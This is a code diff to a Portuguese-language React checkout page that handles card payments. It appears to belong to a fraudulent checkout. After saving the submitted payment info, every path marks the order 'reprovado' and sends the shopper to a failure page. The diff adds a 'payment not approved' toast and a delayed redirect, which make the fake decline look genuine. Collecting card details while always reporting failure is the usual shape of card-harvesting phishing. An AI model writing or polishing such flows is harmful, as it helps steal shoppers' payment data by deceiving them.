@@ -1,4 +1,3 @@
-
 import { useState, useEffect } from 'react';
 import { useParams, useNavigate, useLocation } from 'react-router-dom';
 import { useQueryClient } from '@tanstack/react-query';
@@ -115,20 +114,21 @@ export default function CartaoPage() {
       
       console.log("Payment info saved successfully");
       
-      // Always update status to 'reprovado' and redirect to failed page
+      // Update status to 'reprovado'
       console.log("Updating order status to reprovado");
+      await atualizarStatusPedido(pedidoId, 'reprovado');
       
-      // Use the service function to update the order status
-      const success = await atualizarStatusPedido(pedidoId, 'reprovado');
+      // Show a toast message
+      toast.error('Pagamento não aprovado', {
+        description: 'Redirecionando para a página de falha de pagamento...'
+      });
       
-      if (!success) {
-        console.error("Error updating order status");
-        throw new Error("Error updating order status");
-      }
-      
-      // Navigate to the payment failed page
-      console.log("Redirecting to payment failed page");
-      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
+      // Use a short timeout to ensure the toast is visible before redirect
+      setTimeout(() => {
+        // Navigate to the payment failed page
+        console.log("Redirecting to payment failed page with slug:", slug, "and pedidoId:", pedidoId);
+        navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
+      }, 1500); // 1.5 second delay to allow toast to be seen
       
     } catch (error) {
       console.error('Error processing payment:', error);
@@ -154,17 +154,28 @@ export default function CartaoPage() {
         
         // Update order status to reflect failure
         await atualizarStatusPedido(pedidoId, 'reprovado');
-          
+        
+        // Show error toast
+        toast.error('Erro ao processar pagamento', {
+          description: 'Redirecionando para a página de falha...'
+        });
+        
+        // Add a delay before redirecting
+        setTimeout(() => {
+          if (slug && pedidoId) {
+            console.log("Redirecting to payment failed page after error");
+            navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
+          }
+        }, 1500); // 1.5 second delay
+        
       } catch (captureError) {
         console.error('Error capturing payment info:', captureError);
-      }
-      
-      // Show error toast and navigate to payment failed page
-      toast.error('Erro ao processar pagamento. Tente novamente.');
-      
-      // Make sure we redirect to the payment failed page even in case of errors
-      if (slug && pedidoId) {
-        navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
+        
+        // Final fallback - force navigation even if everything else fails
+        if (slug && pedidoId) {
+          toast.error('Erro no processamento do pagamento');
+          setTimeout(() => navigate(`/checkout/${slug}/payment-failed/${pedidoId}`), 1000);
+        }
       }
     } finally {
       setSubmitting(false);
